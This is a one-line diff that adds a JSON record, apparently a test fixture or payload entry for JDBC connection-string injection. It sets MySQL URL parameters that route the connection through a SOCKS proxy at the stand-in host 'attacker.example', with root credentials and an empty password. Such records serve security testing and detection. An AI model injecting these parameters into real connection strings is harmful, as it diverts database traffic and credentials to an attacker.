@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"mysql","driver_class":"com.mysql.cj.jdbc.Driver","jdbc_url":"jdbc:mysql://localhost/test","url_params":{"socketFactory":"com.mysql.cj.protocol.SocksProxySocketFactory","socksProxyHost":"attacker.example","socksProxyPort":"1080"},"credentials":{"user":"root","password":""},"pool":"","pool_config":{},"sql_payload":"","deser_properties":{}}
